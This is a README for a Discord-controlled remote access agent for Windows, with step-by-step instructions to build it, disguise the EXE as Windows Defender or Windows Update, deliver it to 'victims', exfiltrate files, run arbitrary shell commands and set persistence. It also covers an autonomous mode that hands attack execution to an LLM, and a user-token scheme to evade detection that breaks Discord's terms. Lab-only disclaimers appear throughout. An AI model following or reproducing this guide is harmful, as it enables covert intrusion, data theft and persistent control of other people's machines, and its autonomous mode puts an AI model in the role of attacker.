# ART (Autonomous Red Teamer Discord C2 Agent: Complete Guide)

[![Python Runtime 3.10+](https://img.shields.io/badge/Python%20Runtime-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/downloads/)
[![Python Build 3.13](https://img.shields.io/badge/Python%20Build-3.13-306998?style=for-the-badge&logo=python&logoColor=white)](build.bat)
[![Build: PyInstaller](https://img.shields.io/badge/Build-PyInstaller-5A3E85?style=for-the-badge&logo=python&logoColor=white)](build.bat)
[![Bootstrap: Supported](https://img.shields.io/badge/Bootstrap-Supported-1F883D?style=for-the-badge)](build.bat)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](#3-requirements)
[![License: MIT](https://img.shields.io/badge/License-MIT-2EA44F?style=for-the-badge)](LICENSE)
[![Documentation: Full Guide](https://img.shields.io/badge/Documentation-Full%20Guide-1F6FEB?style=for-the-badge&logo=readme&logoColor=white)](#table-of-contents)
[![Legal Use: Authorized Labs Only](https://img.shields.io/badge/Legal%20Use-Authorized%20Labs%20Only-BD561D?style=for-the-badge)](DISCLAIMER.md)
[![Audience: Students and Researchers](https://img.shields.io/badge/Audience-Students%20%26%20Researchers-6F42C1?style=for-the-badge&logo=bookstack&logoColor=white)](DISCLAIMER.md)
[![Packaging: EXE Ready](https://img.shields.io/badge/Packaging-EXE%20Ready-0A7E8C?style=for-the-badge)](#12-step-7--build-a-standalone-exe)
[![Contributing](https://img.shields.io/badge/Contributing-Guide-ffb000?style=for-the-badge&logo=github&logoColor=white)](CONTRIBUTING.md)
[![Security](https://img.shields.io/badge/Security-Policy-d73a49?style=for-the-badge&logo=shield&logoColor=white)](SECURITY.md)
[![Changelog](https://img.shields.io/badge/Changelog-Tracked-7a52c7?style=for-the-badge&logo=bookstack&logoColor=white)](CHANGELOG.md)

> The ART of Offensive Security
>
> Author: Gabriel Dakinah Vincent

## Table of Contents
1. [Overview](#1-overview)
2. [Features](#2-features)
3. [Requirements](#3-requirements)
4. [Agent Files](#4-agent-files)
5. [Discord Server Structure](#5-discord-server-structure)
6. [Step 1 — Create a Discord Server](#6-step-1--create-a-discord-server)
7. [Step 2 — Register a Bot (Per Victim)](#7-step-2--register-a-bot-per-victim)
8. [Step 3 — Configure Gateway Intents](#8-step-3--configure-gateway-intents)
9. [Step 4 — Generate Invite Link & Add Bot to Server](#9-step-4--generate-invite-link--add-bot-to-server)
10. [Step 5 — Audit Permissions](#10-step-5--audit-permissions)
11. [Step 6 — Configure the Agent Script](#11-step-6--configure-the-agent-script)
12. [Step 7 — Build a Standalone EXE](#12-step-7--build-a-standalone-exe)
13. [Step 8 — Deploy](#13-step-8--deploy)
14. [Step 9 — Operate from Discord](#14-step-9--operate-from-discord)
15. [Step 10 — Repeat for Each Victim](#15-step-10--repeat-for-each-victim)
16. [Roles & Permissions](#16-roles--permissions)
17. [Heartbeat & Offline Detection](#17-heartbeat--offline-detection)
18. [Supported Commands](#18-supported-commands)
19. [Channel Reference](#19-channel-reference)
20. [Troubleshooting](#20-troubleshooting)
21. [Security & Cleanup](#21-security--cleanup)
22. [Improvement — One Bot, Many Agents (User Token Architecture)](#22-improvement--one-bot-many-agents-user-token-architecture)
23. [Comprehensive Guide: One Bot, Many Agents (User Token Architecture)](#23-comprehensive-guide--one-bot-many-agents-user-token-architecture)
24. [Production Deployment Checklist & Security Notes](#24-production-deployment-checklist--security-notes)

---

## 1. Overview

This Discord C2 agent is for Windows. It connects to a Discord server via a bot token, auto-creates all required server categories and channels on first run if they do not exist, creates a unique victim channel, and supports remote command execution and file transfer — all over Discord's API.

Each deployed agent carries its own unique bot token so multiple agents can be online simultaneously without conflict.

---

## 2. Features

- **Remote Command Execution** — Run any shell command from Discord
- **File Upload/Download** — Transfer files to and from the victim
- **File Delete** — Delete files on the victim machine remotely
- **Message Box** — Display a popup message on the victim's screen
- **On-Demand Reporting** — Generate PTES-style reports with `!report` and upload them to `#reports`
- **Autonomous Mode** — Hand execution flow to the LLM with `!mode active`
- **Abort-to-Report Flow** — Stop autonomous mode with `!abort` and generate a report immediately
- **Heartbeat** — Agent sends periodic keep-alive signals with jitter
- **Offline Detection** — Victim channel is automatically tagged `[OFFLINE]` when agent goes silent
- **Role Management** — Auto-creates `Agent` role and assigns it to the bot on connect
- **Channel Management** — Auto-creates required C2 categories and channels on first run
- **Global Logging** — All commands and output logged to `#global-logs`
- **Artifact Separation** — Autonomous artifacts and reports are routed to dedicated channels (`#art-log`, `#reports`, `#intel-feed`, `#payloads`)

---

## 3. Requirements

### Python Version
- **Python 3.10+** is sufficient to run the agent directly
- **Python 3.13** is recommended to build the EXE (Python 3.10.0 has a `dis` module bug that breaks some build tools)
- Python 3.13 download: https://www.python.org/downloads/

### Runtime Dependencies

| Package | Purpose |
|---|---|
| `discord.py` | Discord bot API client |
| `requests` | HTTP file downloads via `!upload <url>` |
| `openai` | Report generation and autonomous planning |
| `aiofiles` | Non-blocking file writes for reports and large message artifacts |

Install runtime packages:
```bash
pip install discord.py requests openai aiofiles
```

### Optional Windows Persistence Dependencies

| Package | Purpose |
|---|---|
| `pywin32` | Required for the Startup Folder Shortcut persistence method |

Install if you plan to use all `!persist` methods:
```bash
pip install pywin32
```

### Build Dependencies

| Package | Purpose |
|---|---|
| `pyinstaller` | Compiling the agent into a standalone EXE |

Install build tooling:
```bash
pip install pyinstaller
```

`build.bat` uses an advanced PyInstaller command with onefile output, explicit pywin32 hidden imports, and a dedicated work directory under `build/`.

### Configuration Requirements

| Setting | Required For | Notes |
|---|---|---|
| `BOT_TOKEN` | All agent operation | Required for Discord connectivity |
| `OPENAI_API_KEY` | `!report`, `!abort`, autonomous mode | Required for LLM-backed reporting and planning |

> The agent can connect to Discord without an OpenAI key, but reporting and autonomous features depend on it.

---

## 4. Agent Files

| File | Description |
|---|---|
| `agent_template.py` | The agent script — configure `BOT_TOKEN` and `OPENAI_API_KEY` here before building |
| `README.md` | Operator guide and deployment notes |
| `agent_logs/agent_deployment_log.xlsx` | Deployment tracking log — record bot tokens and victim assignments here |

> `build_env/` and `build/` are generated locally when you build the EXE and are not committed to the repo.

---

## 5. Discord Server Structure

When the agent runs for the first time it automatically creates the following categories and channels if they don't already exist:

```
Discord Server
│
├── C2 OPERATIONS
│   ├── #briefings          ← Agent check-in announcements
│   └── #sitreps            ← Heartbeat messages
│
├── LOGS & AUDIT
│   ├── #global-logs        ← All command activity logged here
│   ├── #art-log            ← Autonomous logs and rich artifacts
│   └── #reports            ← Generated PTES reports
│
├── CONTROL
│   ├── #payloads           ← Staged files for `!upload <filename>`
│   └── #intel-feed         ← Exfiltrated or mirrored artifacts
│
└── VICTIMS
   └── #cmd-<hostname>-<id>   ← Auto-created per agent, private command channel
```

All channels are private — hidden from `@everyone`, visible only to the bot and server owner.

---

## 6. Step 1 — Create a Discord Server

1. Open Discord and click the **+** icon on the left sidebar.
2. Select **Create My Own** → **For me and my friends**.
3. Name it something relevant (e.g., `C2-Operations`).

> **Tip:** Creating a fresh server avoids permission conflicts from previous setups.

---

## 7. Step 2 — Register a Bot (Per Victim)

Use the naming convention: `victim-<name>-<date>` (e.g., `victim-alice-2026-04-09`)

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Click **New Application** and name it using the convention above.
3. Go to the **Bot** tab → click **Add Bot**.
4. (Optional) Set the bot's username and avatar icon to match the victim identifier for easy tracking.
5. Click **Reset Token** and **copy the token** — you will need it for the agent script.

> **Naming convention:** `victim-<name>-<date>` keeps your bot list organized when managing multiple deployments (e.g., `victim-alice-2026-04-09`, `victim-bob-2026-07-01`). Match the bot username to the application name for consistency.

---

## 8. Step 3 — Configure Gateway Intents

Still on the **Bot** tab, scroll down to **Privileged Gateway Intents** and enable all three:

| Intent | Required |
|---|---|
| Presence Intent | Yes |
| Server Members Intent | Yes |
| Message Content Intent | **Yes — required for agent commands** |

---

## 9. Step 4 — Generate Invite Link & Add Bot to Server

1. In the developer portal, go to **OAuth2 → URL Generator**.
2. Under **Scopes**, select:
   - `bot`
   - `applications.commands`
3. Under **Bot Permissions**, select:
   - View Channels, Send Messages, Read Message History
   - Attach Files, Manage Channels, Manage Messages
   - Manage Roles, Manage Webhooks, Embed Links
   - Mention Everyone, Add Reactions, Use Slash Commands, Manage Threads
4. Copy the generated URL, open it in your browser, select your server, and click **Authorize**.

---

## 10. Step 5 — Audit Permissions

After the bot joins the server, verify the following:

- **Server Settings → Roles → Bot Role:** Confirm `Manage Channels` and `Manage Roles` are enabled.
- **VICTIMS Category → Permissions:** Ensure the bot's role has `View Channel`, `Manage Channels`, and `Send Messages` explicitly set (green checkmarks).
- The bot's role must be **above** any roles it needs to manage in the role hierarchy.

---

## 11. Step 6 — Configure the Agent Script

1. Open `agent_template.py`.
2. Replace the `BOT_TOKEN` value with the token you copied in Step 2:
   ```python
   BOT_TOKEN = "<PASTE_NEW_TOKEN_HERE>"
   ```
3. Replace the `OPENAI_API_KEY` value if you plan to use `!report`, `!abort`, or autonomous mode:
   ```python
   OPENAI_API_KEY = "<PASTE_OPENAI_KEY_HERE>"
   ```
4. Save the file.

> Each deployed agent must have its **own unique bot token**. Never reuse tokens across agents — only one bot with a given token can be online at a time.
>
> The OpenAI key is required for report generation and LLM-driven autonomous operation.

---

## 12. Step 7 — Build a Standalone EXE


Convert `agent_template.py` into a single Windows executable using [PyInstaller](https://pyinstaller.org/).

### Recommended Method — Using build.bat (Python 3.13)


### 1. Create a clean Python 3.13 virtual environment (first time only)
```bat
py -3.13 -m venv build_env
```
### 2. First-time setup: let the build script install dependencies if needed
```bat
build.bat --bootstrap
```
### 3. Normal rebuilds after setup
```bat
build.bat
```

By default, `build.bat` uses `icons/Windows Defender.ico` if that file exists. Change `DEFAULT_ICON_NAME` in `build.bat` if you want a different default.

The output EXE name follows the resolved icon name by default. For example, the default icon produces `build\Windows Defender.exe`.

### 4. Build with a custom EXE icon from `icons/`
```bat
build.bat --icon my-icon.ico
```

Place `.ico` files in the `icons/` folder, then pass the filename to `--icon`. You can combine it with `clean` and `--bootstrap`, for example:
```bat
build.bat clean --bootstrap --icon my-icon.ico
```

If the icon filename contains spaces, quote it:
```bat
build.bat --icon "Microsoft 365.ico"
```

That build will produce `build\my-icon.exe` unless you override the output name explicitly.

For icon filenames, the EXE name follows the same basename by default. For example, `--icon "Microsoft 365.ico"` produces `build\Microsoft 365.exe`.

### 4.1 Override the output EXE name
```bat
build.bat --icon my-icon.ico --name client-updater
```

Use `--name` when you want the EXE filename to be different from the icon filename.

If the output name contains spaces, quote it:
```bat
build.bat --name "Microsoft 365"
```

You can also combine quoted icon and output names:
```bat
build.bat --icon "Microsoft 365.ico" --name "Client Updater"
```

### 5. List available icons
```bat
build.bat --list-icons
```

The build script will produce `build\<resolved-name>.exe`.

Use `build.bat clean` to remove the previous build output before compiling again.

The build script writes the final EXE to `build\<resolved-name>.exe` and keeps PyInstaller work files under `build\pyinstaller_work`.

---

## 13. Step 8 — Deploy

1. Rename the EXE to something inconspicuous (e.g., `WindowsUpdate.exe`)
2. Deliver and execute it on the target machine — no installation required
3. On first run the agent will:
   - Generate a unique ID from the machine's MAC address (UUID fallback if unavailable)
   - Connect to Discord and auto-create all server categories and channels
   - Create its victim channel: `cmd-<hostname>-<uniqueid[:6]>`
   - Post a check-in to `#briefings` and its victim channel:
     ```
     🟢 C2 Agent Online
     Host: DESKTOP-ABC123
     User: john
     ID: a1b2c3d4e5f6
     ```
   - Begin listening for commands

---

## 14. Step 9 — Operate from Discord

Go to the **VICTIMS** category in your Discord server and find the channel named `cmd-<hostname>-<id>`. Type commands directly in that channel.

**Example session:**
```
You:   whoami
Agent: john

You:   !ls C:\Users\john\Desktop
Agent: Directory listing for C:\Users\john\Desktop:
       secret.txt  passwords.xlsx

You:   !download C:\Users\john\Desktop\secret.txt
Agent: 📥 Downloading secret.txt: [file attached]

You:   !message Your computer needs an update
Agent: ✅ Message box displayed.
```

All output is also logged to `#global-logs`.

### Recommended Smoke Test

After the agent checks in, validate the primary operator paths in the victim channel:

1. `!help` — confirm the command list is current
2. `!report` — confirm a report lands in `#reports`
3. `!abort` — confirm passive mode is restored and a report is generated
4. `!mode active` — confirm autonomous mode starts cleanly
5. `!mode passive` — confirm autonomous mode stops and a report is generated

If `!upload <filename>` is part of your workflow, also place a file in `#payloads` and verify retrieval.

---

## 15. Step 10 — Repeat for Each Victim

For every new target, repeat Steps 2–8 with a **new bot application and token**.

Track all deployments in `agent_logs\agent_deployment_log.xlsx`.

| Step | Action |
|---|---|
| 1 | Create bot: `victim-bob-2026-04-09` |
| 2 | Paste Bob's token into `agent_template.py` |
| 3 | Build: Run `build.bat` |
| 4 | Rename to `agent-bob.exe` and deploy |
| 5 | Bob's `cmd-*` channel appears in Discord automatically |

---

## 16. Roles & Permissions

The agent implements automatic role management on first run:

| Role | Created By | Access Granted |
|---|---|---|
| `Agent` | Auto-created by agent | Assigned to the bot itself |
| Server Owner | Discord default | Auto-granted read/write on every victim channel |

> The `Admin` role grant has been removed from the template. Only the bot and the server owner can access victim channels by default.

---

## 17. Heartbeat & Offline Detection

The agent runs a background heartbeat loop:
- Sends a heartbeat to `#sitreps` every **3–5.5 minutes** (randomized jitter)
- If no heartbeat for **5 minutes**, the offline monitor renames the victim channel to `cmd-<hostname>-<id>[OFFLINE]`
- When the agent reconnects, the `[OFFLINE]` tag is automatically removed

---

## 18. Supported Commands

| Command | Description |
|---|---|
| `!help` | Show all available commands |
| `!report` | Generate the current PTES report and upload it to `#reports` |
| `!abort` | Stop autonomous mode, switch to passive mode, and generate a report |
| `!mode active` | Start autonomous mode and hand control to the LLM |
| `!mode passive` | Return to passive mode and generate a report when leaving active mode |
| `!ls [path]` | List directory contents (defaults to current dir) |
| `!cd <path>` | Change current working directory |
| `!download <path>` | Exfiltrate a file from the victim |
| `!upload <url|filename> [dest]` | Download a file from a URL or retrieve a file from `#payloads` to the victim machine |
| `!delete <path>` | Delete a file on the victim machine |
| `!message <text>` | Display a Windows message box on the victim's screen |
| `!persist [setup|cleanup]` | Setup or remove persistence (Registry Run Key, Startup Shortcut, Scheduled Task) |
| Any other text | Executed as a shell command via `subprocess` in the agent's current directory |

> Shell command output over 1900 characters is automatically sent as an attached `out.txt` file.
>
> Commands are only processed in the agent's assigned `#cmd-*` channel.

### 18.1 Reporting And Mode Flow

- `!report` works on demand and uploads the generated markdown report to `#reports`.
- `!abort` forces the agent back to passive mode and immediately generates a report.
- Switching from active mode to passive mode also triggers report generation.
- Report generation uses the latest known assessment context, including baseline context before autonomous actions begin.

---

## 18.2. Persistence Methods

The agent supports robust Windows persistence mechanisms, all controllable via the `!persist` command from Discord:

- **Registry Run Key**: Adds the agent to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` as `WindowsUpdate`.
- **Startup Folder Shortcut**: Creates a shortcut in the user's Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`).
- **Scheduled Task**: Creates a scheduled task named `WindowsUpdate` to run the agent on logon.

**Usage:**
- `!persist setup` — Apply all persistence methods (default if no argument)
- `!persist cleanup` — Remove all persistence methods for OPSEC

All actions and results are logged to `#global-logs` for audit and operational security.

---

## 19. Channel Reference

| Channel | Category | Purpose |
|---|---|---|
| `#briefings` | C2 OPERATIONS | Agent check-in / online notifications |
| `#sitreps` | C2 OPERATIONS | Heartbeat messages |
| `#global-logs` | LOGS & AUDIT | All command activity from all agents |
| `#art-log` | LOGS & AUDIT | Autonomous assessment logs, report-generation flow, and rich artifacts |
| `#reports` | LOGS & AUDIT | Generated PTES reports from `!report`, `!abort`, and completed assessments |
| `#payloads` | CONTROL | File staging area for `!upload <filename>` retrievals |
| `#intel-feed` | CONTROL | File exfiltration and downloaded artifact copies |
| `#cmd-*` | VICTIMS | One channel per agent — send commands here |

---

## 20. Troubleshooting

| Problem | Solution |
|---|---|
| Agent connects but no channels created | Ensure bot has `Manage Channels` and `Manage Roles` permissions |
| `403 Forbidden / Missing Access` | Check bot role is above `@everyone` in role hierarchy |
| Privileged Intents error | Re-check all three intents are enabled in the developer portal |
| Only one agent online at a time | Each agent **must** use a unique bot token |
| Bot not responding to commands | Confirm `Message Content Intent` is ON |
| `[OFFLINE]` tag not clearing | Agent reconnected but offline monitor not running — check the process |
| EXE build crashes | Ensure `pyinstaller` is installed and rerun `build.bat clean --bootstrap` to clear stale work files before rebuilding. |
| `!upload <filename>` says file not found | Upload the file to `#payloads` channel first, then run the command |
| `!report` or `!abort` fails to generate a report | Confirm `OPENAI_API_KEY` is valid and the system can reach the OpenAI API |
| Report command works but console warns about heartbeat delays | Check network latency to OpenAI and avoid long blocking shell commands in the victim channel |

### Known Limitations

- Persistence support is Windows-focused. Registry, Startup Shortcut, and Scheduled Task workflows are not portable to non-Windows systems.
- The popup message command uses platform-specific behavior and is primarily intended for Windows targets.
- Autonomous mode and report generation depend on external OpenAI availability and latency.
- Default shell execution still uses `subprocess` with `shell=True`; long-running commands can delay responses even though report generation itself is now off the Discord event loop.

---

## 21. Security & Cleanup

- **Never** share or commit bot tokens to any repository
- **Never** deploy agents on systems without explicit written authorization
- Remove unused bots from your server and developer portal when no longer needed
- Regularly audit `#global-logs`, `#art-log`, and `#reports` for unauthorized activity
- Rotate bot tokens immediately if you suspect compromise
- This project is intended for **authorized red team labs and research only**

Operational artifacts to review and clean up as needed:

- `out.txt` — temporary attachment for oversized shell output
- `Report.md` — temporary report file before upload to `#reports`
- `agent_audit.log` — local audit trail if enabled in your workflow

---

## 22. Improvement — One Bot, Many Agents (User Token Architecture)

The current architecture (one bot per agent) works well but requires registering a new Discord bot application for every target. The following describes a more scalable approach for future improvement.

### The Idea

Instead of each agent running as its own bot, agents connect to Discord as **regular users** using user tokens. A single C2 bot manages all channels, roles, and communications while agents authenticate as users.

```
Current:   Agent_1 (bot) + Agent_2 (bot) + Agent_3 (bot) → Discord Server
Improved:  Agent_1 (user) + Agent_2 (user) + Agent_3 (user) → Discord Server ← C2 Bot (controller)
```

### Benefits

| | Current (One Bot Per Agent) | Improved (User Token) |
|---|---|---|
| Bot registrations needed | One per agent | One total |
| Scalability | Limited by registration effort | Unlimited |
| Stealth | Agents appear as bots | Agents appear as normal users |
| Setup complexity | Medium | Low (after initial setup) |

### How to Implement It

#### 1. Keep the C2 Bot as the Controller
The existing `agent_template.py` continues to manage server structure, channels, and roles. No changes needed to the bot itself.

#### 2. Switch Agent Library
The standard `discord.py` does not support user tokens. Replace it with `discord.py-self`, a drop-in replacement:

```bash
# In your build venv
build_env\Scripts\python.exe -m pip uninstall discord.py -y
build_env\Scripts\python.exe -m pip install discord.py-self
```

#### 3. Create Discord User Accounts for Agents
- Create one Discord user account per agent (or per campaign)
- Log into each account and retrieve the user token:
  1. Open Discord in a browser
  2. Open DevTools (F12) → **Network** tab
  3. Send any message → find a request with an `Authorization` header
  4. Copy the token value

#### 4. Configure the Agent Script
Replace `BOT_TOKEN` with the user token — the rest of the code stays the same:

```python
BOT_TOKEN = "<DISCORD_USER_TOKEN_HERE>"
```

#### 5. Build and Deploy as Normal
```bash
build.bat
```

### Important Warning

> Using user tokens for automation violates Discord's Terms of Service. User accounts running automated scripts risk permanent ban. **Only use this approach in isolated lab environments or with explicit authorization.** Never use real personal Discord accounts.

---

## 23. Comprehensive Guide: One Bot, Many Agents (User Token Architecture)

This section provides a step-by-step, production-grade guide to implementing a scalable Discord C2 architecture using user tokens (one bot, many agents). This approach allows you to control many agents with a single C2 bot, while each agent appears as a normal Discord user.

### ⚠️ Legal & Ethical Notice
> Automating Discord user accounts is against Discord's Terms of Service. Only use this method in authorized red team labs or research environments. Never use real personal Discord accounts.

See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plain-language interpretation of the Liberia Cybercrime Act, 2021.

### 1. Overview
- **C2 Bot**: A single Discord bot manages all channels, roles, and communications.
- **Agents**: Each agent runs as a Discord user (not a bot), using a user token for authentication.
- **Scalability**: No need to register a new bot for each agent. Unlimited agents per server.

### 2. Prerequisites
- A Discord server with proper structure (see above).
- Python 3.13+ and `pyinstaller` for building agents.
- The `discord.py-self` library for user-token agents.
- (Optional) Automation tools for creating Discord user accounts (see below).

### 3. Setting Up the C2 Bot (Controller)
- Use your existing `agent_template.py` as the C2 bot controller.
- The C2 bot manages all server structure, channels, and roles.
- No changes needed to the C2 bot for this architecture.

### 4. Creating Discord User Accounts for Agents
#### Manual Method
1. Go to [Discord Registration](https://discord.com/register).
2. Create a new user account for each agent (use unique emails, can use temporary email services for labs).
3. Complete email verification and set a username.
4. (Optional) Set a profile picture and nickname for easier tracking.

#### Automated Account Creation (Advanced/Lab Only)
- Use browser automation tools (e.g., Selenium, Puppeteer) to script account creation.
- Services like [mail.tm](https://mail.tm) or [temp-mail.org](https://temp-mail.org) can be used for temporary emails.
- **Note:** Automated account creation is rate-limited and may require CAPTCHA solving.

### 5. Retrieving User Tokens
1. Log in to the agent account in a browser.
2. Open DevTools (F12) → Network tab.
3. Send any message in Discord.
4. Find a request with an `Authorization` header.
5. Copy the token value (this is the user token for the agent).

### 6. Preparing the Agent Script
1. Uninstall `discord.py` and install `discord.py-self` in your build environment:
   ```bash
   build_env\Scripts\python.exe -m pip uninstall discord.py -y
   build_env\Scripts\python.exe -m pip install discord.py-self
   ```
2. In `agent_template.py`, replace the `BOT_TOKEN` value with the user token:
   ```python
   BOT_TOKEN = "<DISCORD_USER_TOKEN_HERE>"
   ```
3. (Optional) Adjust the script to use user-specific logic if needed (most bot logic works as-is with `discord.py-self`).

### 7. Adding Agents to the Server
- Log in to each agent account in a browser or via the script.
- Accept the server invite link (generated by the C2 bot or manually).
- Agents will appear as normal users in the server.

### 8. Building and Deploying Agents
1. Build the agent executable as usual:
   ```bash
   build.bat
   ```
2. Rename the EXE for each agent (e.g., `agent-alice.exe`).
3. Deploy and run on the target machine.

### 9. Operating the C2
- The C2 bot manages all channels and roles.
- Agents (users) join the server and communicate via their assigned channels.
- All commands and exfiltration work as with the bot-based model.

### 10. Automation Tips
- Use scripts to automate user account creation and token extraction for large-scale deployments.
- Maintain a secure log of user tokens and agent assignments.
- Regularly audit server membership and permissions.

### 11. Security & Cleanup
- Never use real/personal Discord accounts for agents.
- Remove unused user accounts and tokens after operations.
- Rotate tokens if compromise is suspected.

### 12. Troubleshooting
- If an agent cannot join the server, check invite validity and account status.
- If commands do not work, ensure `discord.py-self` is installed and the token is valid.
- Monitor for Discord bans or rate limits on automated accounts.

---

## 24. Production Deployment Checklist & Security Notes

### Deployment Checklist

- [ ] Remove all hardcoded secrets (bot tokens, API keys) from code. Use environment variables or a secure config file.
- [ ] Review and restrict Discord bot permissions to the minimum required.
- [ ] Ensure all audit logs (`agent_audit.log`, `#global-logs`) are protected from unauthorized access.
- [ ] Confirm operator approval and OPSEC controls are enabled and tested.
- [ ] Clean up all temporary files after execution (e.g., `out.txt`).
- [ ] Document and track all deployments in `agent_logs/agent_deployment_log.xlsx`.
- [ ] Review all dependencies for vulnerabilities before deployment.
- [ ] Test agent in a controlled lab environment before live use.
- [ ] Never deploy on unauthorized systems or networks.

### Security Recommendations

- **Command Execution:** All shell commands are executed with `subprocess` and `shell=True`. Never allow untrusted user input to reach this logic.
- **Error Handling:** Errors are logged to Discord and audit logs. Avoid leaking sensitive info in error messages.
- **Audit Logging:** All actions and errors are logged locally and in context. Protect audit logs from unauthorized access.
- **Operator Approval:** High-risk and noisy commands require explicit operator approval. Keep keyword lists up to date.
- **No Input Sanitization:** The agent executes any text as a shell command. Never expose this to untrusted users.
- **Discord Permissions:** Only grant the bot the permissions it needs. Regularly audit server roles and permissions.
- **OPSEC:** Regularly review `#global-logs` and audit logs for unauthorized or suspicious activity.
- **Legal & Ethical Use:** This project is for authorized red team labs and research only. Never use on unauthorized systems.

See [DISCLAIMER.md](DISCLAIMER.md) for the dedicated project disclaimer and jurisdiction-specific legal notes.

---

*For advanced automation scripts, user account management, or further guidance, contact your developer or red team lead.*
